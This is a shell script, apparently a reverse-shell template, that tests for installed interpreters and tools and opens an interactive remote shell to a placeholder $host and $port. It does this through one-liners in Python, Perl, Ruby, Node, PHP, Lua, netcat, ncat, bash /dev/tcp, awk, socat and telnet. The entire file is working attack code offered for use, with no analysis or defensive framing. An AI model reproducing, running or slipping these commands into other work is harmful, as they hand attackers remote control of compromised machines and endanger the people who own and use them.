if command -v python > /dev/null 2>&1; then 
	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$host",$port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi

if command -v python2 > /dev/null 2>&1; then 
	python2 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$host",$port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi

if command -v python3 > /dev/null 2>&1; then 
	python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$host",$port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi

if command -v perl > /dev/null 2>&1; then 
	perl -e 'use Socket;$i="$host";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};';
	perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$host:$port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;';
	
	exit;
fi

if command -v ruby > /dev/null 2>&1; then 
	ruby -rsocket -e'f=TCPSocket.open("$host",$port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)';
	ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$host","$port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
	
	exit;
fi

if command -v node > /dev/null 2>&1; then 
	node -e '(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect($port, "$host", function(){client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);}); return /a/; })();';
	node -e "require('child_process').exec('nc -e sh $host $port');";
	
	exit;
fi

if command -v nodejs > /dev/null 2>&1; then 
	node -e '(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect($port, "$host", function(){client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);}); return /a/; })();';
	node -e "require('child_process').exec('nc -e sh $host $port');";
	
	exit;
fi

if command -v php > /dev/null 2>&1; then 
	php -r '$sock=fsockopen("$host",$port);exec("/bin/sh -i <&3 >&3 2>&3");'
	exit;
fi

if command -v lua > /dev/null 2>&1; then 
	lua -e "require('socket');require('os');t=socket.tcp();t:connect('$host','$port');os.execute('/bin/sh -i <&3 >&3 2>&3');"
	exit;
fi

if command -v nc > /dev/null 2>&1; then 
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f;
	nc -e /bin/sh $host $port;
	
	exit;
fi

if command -v ncat > /dev/null 2>&1; then 
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat $host $port >/tmp/f;
	ncat -e /bin/sh $host $port;
	
	exit;
fi

if command -v sh > /dev/null 2>&1; then 
	/bin/sh -i >& /dev/tcp/$host/$port 0>&1
	exit;
fi

if command -v bash > /dev/null 2>&1; then 
	sh -i 5<> /dev/tcp/$host/$port 0<&5 1>&5 2>&5
	exit;
fi

if command -v awk > /dev/null 2>&1; then 
	awk 'BEGIN {s = "/inet/tcp/0/$host/$port"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
	exit;
fi

if command -v socat > /dev/null 2>&1; then 
	socat TCP:$host:$port EXEC:'bash -li',pty,stderr,setsid,sigint,sane
	exit;
fi

if command -v telnet > /dev/null 2>&1; then 
	TF=$(mktemp -u);mkfifo $TF && telnet $host $port 0<$TF | sh 1>$TF
	exit;
fi